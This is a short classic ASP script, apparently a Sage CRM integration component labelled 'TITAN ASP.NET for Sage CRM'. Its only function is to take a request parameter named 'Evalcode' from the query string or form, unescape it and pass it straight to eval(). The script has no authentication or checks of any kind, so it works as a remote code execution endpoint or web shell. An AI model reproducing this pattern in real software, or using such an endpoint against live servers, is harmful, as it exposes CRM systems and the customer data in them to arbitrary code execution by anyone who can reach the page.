<!-- #include file ="SageCRM.js" -->
<%
//******************************************************************************
//******************************************************************************
/*
*  TITAN ASP.NET for Sage CRM
*/
//******************************************************************************
try{
  var Evalcode=new String(Request.QueryString("Evalcode"));
  if (!Defined(Evalcode))
  {
    Evalcode=new String(Request.Form("Evalcode"));
  }  
  if (Defined(Evalcode))
  {
    Evalcode=unescape(Evalcode);
    eval(Evalcode);
  }
  Response.End();
}catch(e){
  logerror(e);
}

%>